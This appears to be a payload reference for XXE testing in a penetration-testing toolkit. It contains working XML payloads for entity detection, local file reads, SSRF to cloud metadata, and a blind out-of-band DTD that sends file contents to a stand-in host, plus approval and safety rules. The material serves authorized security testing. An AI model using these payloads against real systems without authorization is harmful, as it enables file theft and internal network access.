# XXE payloads (shared by xxe-inband / xxe-blind)
# Benign internal entity for detection; file reads / OOB are the variants (approval). NO DoS (no billion laughs).

## Detection — benign internal entity (feeder)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x "RS7F3Q"> ]>
<root><name>&x;</name></root>
```
If `RS7F3Q` appears in the response, the parser resolves entities → XXE candidate.

## In-band file read (xxe-inband)
```xml
<!DOCTYPE r [ <!ENTITY f SYSTEM "file:///etc/hostname"> ]>
<root><name>&f;</name></root>          <!-- prefer a non-sensitive marker file; /etc/hostname over /etc/passwd -->
```
Error-based (when the entity can't go in a text node): trigger a parse error that echoes the file.

## SSRF-via-XXE
```xml
<!DOCTYPE r [ <!ENTITY f SYSTEM "http://169.254.169.254/ or http://INTERNAL/"> ]>
<root>&f;</root>                        <!-- hand cloud-metadata to ssrf-cloud; this proves the fetch -->
```

## Blind / OOB (xxe-blind) — external DTD with parameter entities
```xml
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://TOKEN.oob.example/x.dtd"> %ext;
]>
<root>test</root>
```
`x.dtd` (on your OOB host):
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TOKEN.oob.example/?d=%file;'>">
%eval; %exfil;
```
A callback carrying the file content (or just a DNS/HTTP hit) proves blind XXE.

## Upload vectors
- **SVG:** `<svg xmlns="..."><!DOCTYPE...>` — image upload that gets parsed.
- **DOCX/XLSX:** XML inside the zip (`word/document.xml`) — repackage with an XXE payload.

## Safety
Prefer `/etc/hostname` over `/etc/passwd` for proof; never entity-expansion DoS; never read secrets
you don't need. External file read + SSRF-via-XXE are approval-gated.
